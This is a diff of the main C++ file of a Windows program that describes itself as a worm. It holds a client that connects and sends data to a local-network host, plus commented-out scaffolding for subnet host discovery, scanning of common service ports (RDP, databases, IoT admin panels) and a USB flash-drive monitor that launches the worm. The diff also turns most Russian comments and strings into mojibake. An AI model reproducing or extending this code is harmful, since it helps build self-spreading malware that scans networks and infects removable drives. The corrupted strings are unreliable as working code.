@@ -1,4 +1,4 @@
-
+п»ї
 #include "DataSend.h"
 #include "worm.h"
 #include "NetUtils.h"
@@ -16,7 +16,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 	SetConsoleOutputCP(CP_UTF8);
 	SetConsoleCP(CP_UTF8);
 
-	std::locale loc("ru_RU.UTF-8");  // или std::locale loc("");
+	std::locale loc("ru_RU.UTF-8");  // РёР»Рё std::locale loc("");
 	std::wcout.imbue(loc);
 	std::wcerr.imbue(loc);
 
@@ -29,30 +29,30 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 
 	worm1.worm_was_started();
 
-	// часть с отправлением сообщений на локальный айпишник 
-	DataSend client("127.0.0.1", 12345); // 127.0.0.1 — локальный IP, порт 12345
+	// С‡Р°СЃС‚СЊ СЃ РѕС‚РїСЂР°РІР»РµРЅРёРµРј СЃРѕРѕР±С‰РµРЅРёР№ РЅР° Р»РѕРєР°Р»СЊРЅС‹Р№ Р°Р№РїРёС€РЅРёРє 
+	DataSend client("192.168.0.147", 12344); // 192.168.0.147 вЂ” Р»РѕРєР°Р»СЊРЅС‹Р№ IP, РїРѕСЂС‚ 12345
 
-	// Подключаемся к серверу
+	// РџРѕРґРєР»СЋС‡Р°РµРјСЃСЏ Рє СЃРµСЂРІРµСЂСѓ
 	if (client.connectToServer()) {
-		std::cout << "Соединение установлено!\n";
+		std::wcout << L"РЎРѕРµРґРёРЅРµРЅРёРµ СѓСЃС‚Р°РЅРѕРІР»РµРЅРѕ!\n";
 
-		// Отправляем данные
-		if (client.sendData("Привет, сервер!")) {
-			std::cout << "Данные успешно отправлены.\n";
+		// РћС‚РїСЂР°РІР»СЏРµРј РґР°РЅРЅС‹Рµ
+		if (client.sendData("РџСЂРёРІРµС‚, СЃРµСЂРІРµСЂ!")) {
+			std::wcout << L"Р”Р°РЅРЅС‹Рµ СѓСЃРїРµС€РЅРѕ РѕС‚РїСЂР°РІР»РµРЅС‹.\n";
 		}
 		else {
-			std::cout << "Ошибка при отправке данных.\n";
+			std::wcout << L"РћС€РёР±РєР° РїСЂРё РѕС‚РїСЂР°РІРєРµ РґР°РЅРЅС‹С….\n";
 		}
 
-		// Отключаемся от сервера
+		// РћС‚РєР»СЋС‡Р°РµРјСЃСЏ РѕС‚ СЃРµСЂРІРµСЂР°
 		client.disconnect();
 	}
 	else {
-		std::cout << "Не удалось подключиться к серверу.\n";
+		std::wcout << L"РќРµ СѓРґР°Р»РѕСЃСЊ РїРѕРґРєР»СЋС‡РёС‚СЊСЃСЏ Рє СЃРµСЂРІРµСЂСѓ.\n";
 	}
 
 
-	// часть со сканированем портов
+	// С‡Р°СЃС‚СЊ СЃРѕ СЃРєР°РЅРёСЂРѕРІР°РЅРµРј РїРѕСЂС‚РѕРІ
 	//vector<wstring> alive_ip;
 	//auto net_info = get_local_ip_and_subnet();
 	//if (net_info.size() == 2)
@@ -60,10 +60,10 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 	//	std::wstring ip = net_info[0];
 	//	std::wstring mask = net_info[1];
 
-	//	auto range = generate_ip_range(ip, mask); // теперь правильно
+	//	auto range = generate_ip_range(ip, mask); // С‚РµРїРµСЂСЊ РїСЂР°РІРёР»СЊРЅРѕ
 	//	for (const auto& ip_ws : range) {
-	//		bool host_bool = is_host_alive(ip_ws); // 0 <-> is_host_alive(ip_ws); // поменять (раскомментировать)
-	//		std::wcout << ip_ws << L" " << host_bool << std::endl;// удалить
+	//		bool host_bool = is_host_alive(ip_ws); // 0 <-> is_host_alive(ip_ws); // РїРѕРјРµРЅСЏС‚СЊ (СЂР°СЃРєРѕРјРјРµРЅС‚РёСЂРѕРІР°С‚СЊ)
+	//		std::wcout << ip_ws << L" " << host_bool << std::endl;// СѓРґР°Р»РёС‚СЊ
 	//		if (host_bool) {
 	//			alive_ip.push_back(ip_ws);
 	//		}
@@ -92,25 +92,25 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 	//1900,  // SSDP (UPnP)
 	//3306,  // MySQL
 	//3389,  // RDP
-	//5357,  // еще какой то порт
+	//5357,  // РµС‰Рµ РєР°РєРѕР№ С‚Рѕ РїРѕСЂС‚
 	//5432,   // PostgreSQL
-	//8443, // HTTPS админка / IoT интерфейсы
+	//8443, // HTTPS Р°РґРјРёРЅРєР° / IoT РёРЅС‚РµСЂС„РµР№СЃС‹
 	//8008, //Chromecast HTTP
 	//8009, //Chromecast CAST/DIAL
 	//9000, //Sonos / Plex / NAS
 	//5353 
 	//};
 
-	//vector<wstring> ip_vector = { L"192.168.0.147", L"192.168.0.1", L"192.168.0.184", L"192.168.0.187"}; // удалить 
+	//vector<wstring> ip_vector = { L"192.168.0.147", L"192.168.0.1", L"192.168.0.184", L"192.168.0.187"}; // СѓРґР°Р»РёС‚СЊ 
 
-	//for (wstring& ip : alive_ip) { // alive_ip <-> ip_vector // поменять
-	//	wcout << L"проверяем " << ip << endl; // удалить
+	//for (wstring& ip : alive_ip) { // alive_ip <-> ip_vector // РїРѕРјРµРЅСЏС‚СЊ
+	//	wcout << L"РїСЂРѕРІРµСЂСЏРµРј " << ip << endl; // СѓРґР°Р»РёС‚СЊ
 	//	for (int port : critical_and_popular_ports) {
 	//		bool test_port = is_port_open(ip, port);
 	//		if (test_port) {
-	//			wcout << ip << " " << port << endl; // удалить
+	//			wcout << ip << " " << port << endl; // СѓРґР°Р»РёС‚СЊ
 
-	//			// часть со сканированием портов
+	//			// С‡Р°СЃС‚СЊ СЃРѕ СЃРєР°РЅРёСЂРѕРІР°РЅРёРµРј РїРѕСЂС‚РѕРІ
 	//			
 
 
@@ -123,8 +123,8 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 
 
 
-	// часть с работой самого червя
-	//return worm1.run_device_monitor(hInstance); // запуск мониторинга флешек
+	// С‡Р°СЃС‚СЊ СЃ СЂР°Р±РѕС‚РѕР№ СЃР°РјРѕРіРѕ С‡РµСЂРІСЏ
+	//return worm1.run_device_monitor(hInstance); // Р·Р°РїСѓСЃРє РјРѕРЅРёС‚РѕСЂРёРЅРіР° С„Р»РµС€РµРє
 
 
 
@@ -145,7 +145,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 	////worm1.print_file_to_copy();
 
 	//worm1.worm_was_end();
-	//return worm1.run_device_monitor(hInstance); // запуск мониторинга флешек
+	//return worm1.run_device_monitor(hInstance); // Р·Р°РїСѓСЃРє РјРѕРЅРёС‚РѕСЂРёРЅРіР° С„Р»РµС€РµРє
 
 
 	//wcout<<get_own_path();
